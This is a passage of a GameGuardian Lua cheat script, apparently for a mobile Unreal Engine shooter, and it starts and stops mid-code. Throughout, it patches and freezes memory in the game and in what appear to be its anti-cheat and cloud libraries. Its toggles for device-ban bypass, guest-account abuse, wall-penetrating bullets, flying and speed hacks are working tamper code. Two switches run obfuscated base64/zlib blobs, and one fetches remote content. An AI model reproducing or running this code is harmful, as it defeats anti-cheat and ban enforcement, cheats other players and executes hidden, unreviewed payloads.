gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B4CBC}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B4CE4}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B50EC}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B5114}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})
string.toMusic('开启成功')
end),
changan.switch("大厅第二套",
function()	
gg.loopKillGG()-----杀GG
local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0x50}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0xD0}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0x110}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0x14}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0x54}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0xD4}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0x114}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0xC0}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0xC4}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0x84}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0x44}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0x4}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0x104}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0xC8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0x48}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0x4C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0xCC}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0x10C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0x90}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0xA28, 0x100, 0x40, 0x10}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 131328, freeze = true}})
string.toMusic('开启成功')
end),
changan.switch("大厅第三套",
function()	
gg.loopKillGG()-----杀GG
local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x190, 0x2B8, 0x21C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x190, 0x2B8, 0x20C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x198, 0x2B8, 0x198}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x198, 0x2B8, 0x188}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x198, 0x2B8, 0x1C8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x198, 0x2B8, 0x1D8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x198, 0x2B8, 0x23C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x198, 0x2B8, 0x22C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x198, 0x2B8, 0x21C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x198, 0x2B8, 0x20C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x198, 0x2B8, 0x24C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x198, 0x2B8, 0x25C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x198, 0x2B8, 0x26C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x198, 0x2B8, 0x27C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x190, 0x2B8, 0x198}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x190, 0x2B8, 0x188}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x190, 0x2B8, 0x1C8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x190, 0x2B8, 0x1D8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x190, 0x2B8, 0x23C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})

local t = {"libanogs.so:bss", "Cb"}
local tt = {0x6558, 0x1B0, 0x190, 0x2B8, 0x22C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 17664, freeze = true}})
string.toMusic('开启成功')
end),
changan.switch("离线①",
function()		
so=gg.getRangesList('libgcloud.so')[1].start
py=0x4245E8
setvalue(so+py,4,0)
so=gg.getRangesList('libgcloud.so')[1].start
py=0x497648
setvalue(so+py,4,0)
string.toMusic('开启成功')
end,
function()
so=gg.getRangesList('libgcloud.so')[1].start
py=0x4245E8
setvalue(so+py,4,1018948552)
so=gg.getRangesList('libgcloud.so')[1].start
py=0x497648
setvalue(so+py,4,1018948552)
string.toMusic('关闭')				
end),
changan.text("万能工具箱专区🛠️","#00FF00","10sp"),--空文本可用于换
changan.switch("过封锁设备",
function()	
gg.loopKillGG()-----杀GG
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x164380, 0x0}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 4, value = 31183856590, freeze = true}})
string.toMusic('开启成功')
end),
changan.switch("自动刷8级号",
function()	
local thread7 = luajava.startThread(B7)
floatingWindow:setCache(cacheName, thread7)
string.toMusic('开启成功，使用教程，局内开启，自动行走，不会隔离帐号')
end,
function()
local t = staticstart({"libUE4.so:bss", "Cb",1})
local tt = {0x3ABD8,0x0,0x460,0x1B4-0x90}
local ttt = GotoPointer(t, tt)
breakice(ttt,F,3497450139768418399)
local t = staticstart({"libUE4.so:bss", "Cb",1})
local tt = {0x3ABD8,0x0,0x460,0x1B4-0x90+0x4}
local ttt = GotoPointer(t, tt)
breakice(ttt,F,3497450139768418399)
local thread7 = floatingWindow:getCache(cacheName)
interruptThread(thread7)
toMusic('人才')---语音
end),
changan.switch("无限游客",
function()		
file.cpp(("eNrtmmtP21YYgL+fX3FksmVMipM00LSC0FEWIaqtRCF8mMqEDvZJchbfdHySQadJTFrVi4SY1G2oa6XRaWyrNHX7tFK29sdMJJB/sRPbkAuxY5wwvjhCsWW/7/OeC3nzyDCnKzpdXSwWM9EVfCehRqH9GoMFvM5gHpuYgZsLuSo1FGzFJKeuTzphY9C+zgPyWHbuplIdEH4ZAMYyQv3nX48ePj3cf3z07W+Nnd3mk28a+/v1lz+JQABgTGvVUoiGQW4plXlPOP7j1fHbx/V7e4d/7x3uPzr+5avm/a2jNy/tHP7eeLB99MPX9YPt+vYrCCKMQWEcYKmswxiGQuQLa0BfCkA3GNE1kyPrT980n9xrPNsSoNDY2Wv++MI+r2//2Xj91j4//utRfWvHPm9ubtbvH3CqiRUsMchJkGgttsO888GnvICsg9ZMJWRiGLFjgDN72FFzHEgKRrR7iPbicYipYGzAhDhp3beDhOaL3/nUG7v/NJ4diK2X4GRrGJ4scOdrJZFKtZY/rUL47/fPPX4S78AVGj2tmvTHTVrcXQ9uckiwK/tKMHCqA9yfnRoJuA97YlTgXvZkMPDVfuAu9tXRgtvs9MjBDvtaMPAVT3CLff2CwLvJxBmyfZZ02gOoEEWBkq6KDGsS1phISs4tqsIYLcK4jBiy37rD4mYZUSyvGhQXTaBWZEL9BktlVZdhOp32mzBwLEWiYBOA+eXsUiEj+KPGZVwjEl4lsriuKsJJkYgFcXri9A1+C9YwNXkHzkSTYiIKOU2XiVbKRKusGLsWhSZDmowUXePfVxvYjMIbM2BaRcaM1ZinTUZ5NNSQijMrAuWxuroizEzH7Rt9o4jGoYoyKKxaJTKPieRnb3+4+LFziA04dh/a/Ol4a8wCnDlZgoGr3rq2xr+IejZIxTJB8UR8VpOpTmT3DYsreoloMSLzi6RIMBXZOgvKWs5OzPNViS+Vkax/XqBIqmCaXWcU9bu0oDFMLTjDgOlVqfx/Fgw4xcJ8bjbgYK3UgGVzVC9RpN4kGqIbc0gqB12xPiBi8F8hfg/GFuDiciG3XIAxGUqKXpXFmmqI/EN1FxmGyHkw9hnMZ29l5wpdWQu3rSRzYJLT8ZDa+sBSxttrT+OzBo0NIpX4tppiFU+IS4aCzPKsxEiNsA347kyracS1qqIACDp78tRU28LathdaWGhhoYWFFjbAwk4lzKiulcQKVfU13i89Pawr0oeKecS72phHjp9BeTqZOzvUskBa1r2g5zWzPjs3jJz1w120n424ZvCJ+rc01+zgxYO6mk/W5eta90BHZGztZ3KhsYXGFhpbaGx+jY3iiq5bTUn19LWOOB+25hrt6mquGYOH4+lpbtzQ0gJZWudyntfRzuzZMIZ2FnbRfjbSikEn6d/NXHKDFg7qZb5Il29lncM8n5O5GFn7L6OhkYVGFhpZaGR+jaymlexGNPghWneoDy/zSnBVM68kX+PyFDQPeuhogRytZ0XPq2n9Nm8YU+vLu2hZG3XRIabqX9nc04coH1Tc/MIu3916RnrOR2oeT9VO/6OtM2CNYlRxS3l/HDoGt/mw+fx1Y2e38d0DGMlncx99Ijhx2EQSkPkM/wPoOHEm"):base64("de"):unzip(), true)
string.toMusic('无限游客刷新成功')
end),
changan.switch("下线清除残留[未更新]",
function()		
file.cpp(("eNrtmcFOg0AURfd+RX9ApvIeWJcuGrcm6rqZwpQ2FGimtPr51ujOJsYJ054FWxLIyZt739wbfDO59auJ2fedt5Uzrjlsbe9KMzWPbem7TWlK21tTdE3iXd11ye6wrBqz2mzd3rzN9ck2zrysbdm9v3pb1M7PP3pvzz6yx9OHn229N9XprcXO9sV6kSYPyTS5m93lWbKz9Y2/DlHR+V9E6f01ic7OSHBEKY5oSiPKZjiifCT6kwinI8XpSHGnphmOCLezFadswSlbcHe/4LwmiiPCeU1w+Uj+7/5jW33zdMsTDyT8Dws1UP6/wKSECJUSoYhCD+gCF4DKR6hopSA+lBI1pcTj04wIRdzoShS6EIUuxJQgRPcF9IULQBHdJ8Q8FVAcetcWru2TTQUpDcMBDVQYIk9IaEApDYgm6oCCEBkoH4EGLwVxgZSmIaUdmWY0INqmVpqohSZqod32QnNZQOCPDERzmdDyUEDI/2odSe1RPwcGZRoo6sefkwCZUiATUOMBsT8+Uz4yRcr/0ZkUqCcFnp1mQCbgHlegxgWocQHmAgH6LqAaxGcC+k6A+emnI3wCK5AFOA"):base64("de"):unzip())
string.toMusic('下线清除残留开启成功')
 

end),


}, {
changan.text("功能专区","#00FF00","15sp"),--空文本可用于换行，sp调整距离
changan.switch("全枪无后",
function()				
so=gg.getRangesList('libUE4.so')[1].start
py=0x54EC284
setvalue(so+py,16, 8.8411673e-21)--功能:午后
--[5].地址:709FFED378    数值:8.841164880908183E-21
so=gg.getRangesList('libUE4.so')[1].start
py=0x54EC378
setvalue(so+py,16, 8.8411673e-21)--功能:午后
--[6].地址:709FFED3E8    数值:8.841164880908183E-21
so=gg.getRangesList('libUE4.so')[1].start
py=0x54EC3E8
setvalue(so+py,16, 8.8411673e-21)--功能:午后
			toMusic("开启成功")
									end,
							function()
toMusic('人才')---语音
end),
changan.switch("子弹穿墙",
function()				
gg.clearResults()
gg.setRanges(gg.REGION_C_BSS)
gg.searchNumber('3497450139768418399', gg.TYPE_QWORD)
napm = gg.getResults(69)
gg.editAll('9074961892185783746', gg.TYPE_QWORD)
gg.clearResults()
			toMusic("开启成功")
									end,
							function()
gg.clearResults()
gg.setRanges(gg.REGION_C_BSS)
gg.searchNumber('9074961892185783746', gg.TYPE_QWORD)
napm = gg.getResults(69)
gg.editAll('3497450139768418399', gg.TYPE_QWORD)
gg.clearResults()							
toMusic('人才')---语音
end),
changan.switch("基址范围",
function()				
so=gg.getRangesList('libUE4.so')[1].start
py=0x334A568
setvalue(so+py,16, 60)
			toMusic("开启成功")
									end,
							function()
so=gg.getRangesList('libUE4.so')[1].start
py=0x334A568
setvalue(so+py,16, 0.10000000149)							
toMusic('关闭成功')---语音
end),
changan.switch("全枪据点",
function()				
so=gg.getRangesList('libUE4.so')[1].start
py=0x54E7874
setvalue(so+py,16, 8.47963525e-21)--功能:🐔点
			toMusic("开启成功")
									end,
							function()
toMusic('人才')---语音
end),
changan.switch("基址广角",
function()				
so=gg.getRangesList('libUE4.so')[1].start--广角
py=0x334BE48
setvalue(so+py,16,2)
toMusic("开启成功")
end,
			
							function()	
so=gg.getRangesList('libUE4.so')[1].start--广角
py=0x334BE48
setvalue(so+py,16,1)							
toMusic('人才')---语音
end),
changan.switch("动态广角",
function()				
k = gg.prompt({"你的数值修改: [90;150]"},{"110"},{"number"})
if k== nil then else
R=k[1]
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x2F0,0x170,0x31C}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = R}})
toMusic("开启成功")
end
end,
			
							function()	
toMusic('人才')---语音
end),
changan.switch("全枪防抖",
function()				
so=gg.getRangesList('libUE4.so')[1].start--防抖
py=0x8A09CFC
setvalue(so+py,4,505872707)
so=gg.getRangesList('libUE4.so')[1].start
py=0x60C9E14
setvalue(so+py,4,1409287341)
			toMusic("开启成功")
									end,
							function()
toMusic('人才')---语音
end),
changan.switch("六道模式",
function()				
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3AD38,0x0,0x1A0,0x0,0x7A8,0x528}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = -9999999999999999999999}})--负数越大射速越快
			toMusic("开启成功")
									end,
							function()
							
toMusic('人才')---语音
end),
changan.switch("枪械变大",
function()				
OP=gg.prompt({'1至10'},{[1]='3'},{[1]='number'})
	if OP == nil or OP[1] == '' or OP[1] == '0' then gg.toast("取消")
		else
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0xDC8,0x50,0x580}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = OP[1]}})

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0xDC8,0x50,0x584}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = OP[1]}})


local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0xDC8,0x50,0x588}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = OP[1]}})
toMusic("开启成功")
end
end,
function()
							
toMusic('人才')---语音
end),
changan.switch("子弹变大",
function()				
OP=gg.prompt({'1至50'},{[1]='10'},{[1]='number'})
	if OP == nil or OP[1] == '' or OP[1] == '0' then gg.toast("取消")
		else
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0xDC8,0x50,0xF78}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = OP[1]}})

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0xDC8,0x50,0xF7C}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = OP[1]}})


local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0xDC8,0x50,0xF80}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = OP[1]}})
toMusic("开启成功")
end
end,
function()
							
toMusic('人才')---语音
end),
changan.switch("人物变大",
function()				
k = gg.prompt({"你的数值修改: [1;5]"},{"2"},{"number"})
if k== nil then else
R=k[1]
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x1B0,0x1C0}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 16, value = R, freeze = true}})

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x1B0,0x1C4}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 16, value = R, freeze = true}})

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x1B0,0x1C8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 16, value = R, freeze = true}})
toMusic("开启成功")
end
end,
function()
							
toMusic('人才')---语音
end),
changan.switch("人物反向",
function()				
k = gg.prompt({"你的数值修改: [-1;1]"},{"-1"},{"number"})
if k== nil then else
R=k[1]
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x1B0,0x1C0}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 16, value = R, freeze = true}})

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x1B0,0x1C4}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 16, value = R, freeze = true}})
toMusic("开启成功")
end
end,
function()
							
toMusic('人才')---语音
end),
changan.switch("快速切枪",
function()				
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0xEA8,0x160,0x120,0x10}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 99999}})
			toMusic("开启成功")
									end,
							function()
toMusic('人才')---语音
end),
changan.switch("锁定帧率",
function()				
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x49DD20, 0x34}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 144, freeze = true}})

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x49DD20, 0x38}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 144, freeze = true}})
			toMusic("开启成功")
									end,
							function()
toMusic('人才')---语音
end),
changan.switch("全图除雾",
function()				
so=gg.getRangesList('libUE4.so')[1].start--除雾
py=0x7BC8528
setvalue(so+py,16,8.95671814e-21)
			toMusic("开启成功")
									end,
							function()
toMusic('人才')---语音
end),
changan.switch("去除惯性",
function()				
local t = staticstart({"libUE4.so:bss", "Cb",1})
local tt = {0x3ABD8,0x0,0x460,0x1B4+0x54}
local ttt = GotoPointer(t, tt)
setvalue(ttt,F,99999)
			toMusic("开启成功")
									end,
							function()
local t = staticstart({"libUE4.so:bss", "Cb",1})
local tt = {0x3ABD8,0x0,0x460,0x1B4+0x54}
local ttt = GotoPointer(t, tt)
setvalue(ttt,F,99999)							
toMusic('人才')---语音
end),
changan.switch("枪械瞬击",
function()				
so=gg.getRangesList('libUE4.so')[1].start
py=0x8B59130
setvalue(so+py,16,8.95671814e-21)
			toMusic("开启成功")
									end,
							function()
toMusic('人才')---语音
end),
changan.switch("跳伞加速",
function()				
string.toMusic("将于15秒后关闭")
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3AD38,0x0,0x198,0x84}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 3}})
gg.sleep(15000)
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3AD38,0x0,0x198,0x84}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 1}})
			toMusic("关闭成功")
									end,
							function()
toMusic('人才')---语音
end),
changan.switch("人物跳远",
function()				
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3AD38,0x0,0x48,0x8,0x1D8}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 99999}})--惯性

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3AD38,0x0,0x1018}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 3}})
toMusic('开启成功')---语音
end,
function()
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3AD38,0x0,0x48,0x8,0x1D8}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 8192}})--惯性

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3AD38,0x0,0x1018}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 1}})
toMusic('关闭成功')---语音
end),
changan.text("危险功能区","#00FF00","10sp"),--空文本可用于换行，sp调整距离
changan.switch("斗宗强者",
function()				
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x84}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 0.1}})

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x2F0,0x40,0x160,0x170,0x0}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 5}})

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x528}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 99999}})

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x2F0,0x40,0x160,0x120,0xD0}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 70}})

OP=gg.prompt({'443到4000,飞行高度'},{[1]='1000'},{[1]='number'})
	if OP == nil or OP[1] == '' or OP[1] == '0' then gg.toast("取消")
		else
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x460,0x1B4}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = OP[1]}})

OP=gg.prompt({'9999到999999,飞行速度'},{[1]='99999'},{[1]='number'})
	if OP == nil or OP[1] == '' or OP[1] == '0' then gg.toast("取消")
		else
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x460,0x208}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = OP[1]}})

so=gg.getRangesList('libUE4.so')[1].start
py=0x8B17928
setvalue(so+py,16,-3.4564993e10)
toMusic('开启成功')---语音
end
end
end,
function()
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x84}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 1}})

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x2F0,0x40,0x160,0x170,0x0}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 1}})

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x528}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 1.40129846e-45}})

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x2F0,0x40,0x160,0x120,0xD0}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 70}})

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x460,0x1B4}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 443}})

local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3ABD8,0x0,0x460,0x208}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 8192}})

so=gg.getRangesList('libUE4.so')[1].start
py=0x8B17928
setvalue(so+py,16,8.50279631e-21)
toMusic('关闭成功')---语音
end),
changan.switch("人物加速",
function()				
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3AD38,0x0,0x1018}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 10}})				
so=gg.getRangesList('libUE4.so')[1].start
py=0x8B17928
setvalue(so+py,16,-3.4564993e10)
			toMusic("开启成功")
									end,
							function()
local t = {"libUE4.so:bss", "Cb"}
local tt = {0x3AD38,0x0,0x1018}
local ttt = S_Pointer(t, tt, true)
gg.setValues({{address = ttt, flags = 16, value = 1}})							
so=gg.getRangesList('libUE4.so')[1].start--关闭加速
py=0x8B17928
setvalue(so+py,16,8.50279631e-21)
toMusic('关闭成功')---语音
end),
changan.text("其他的美化","#00FF00","10sp"),--空文本可用于换行，sp调整距离
changan.switch("美化代码查询",
function()	
local a = gg.makeRequest("http://wp.gglua.cc/down.php/8191a74791d3ff1bf194bb5ceb02daf3.txt").content
mainn = 5
czdm = function(A0_4059, A1_4060)
local L2_4061, L3_4062
L2_4061 = 0
L3_4062 = {}
for _FORV_7_ = 1, #A0_4059 do
if string.find(A0_4059[_FORV_7_], A1_4060) then
L3_4062[_FORV_7_] = A0_4059[_FORV_7_]
L2_4061 = L2_4061 + 1
gg.toast("已搜索到[" .. L2_4061 .. "]条")
end
end
local el1 = gg.choice(L3_4062, nil, "共找到[" .. L2_4061 .. "]条")
if el1 == nil then
if nil then
end
else
gg.copyText(L3_4062[el1])
end
end
local el2 = gg.prompt({
[1] = "输入代码名称"
}, nil, {
[1] = "text"
})
if el2 == nil then
Main()
else
local tab={}
for _FORV_5_ in a:gmatch(("【(.-)】")) do
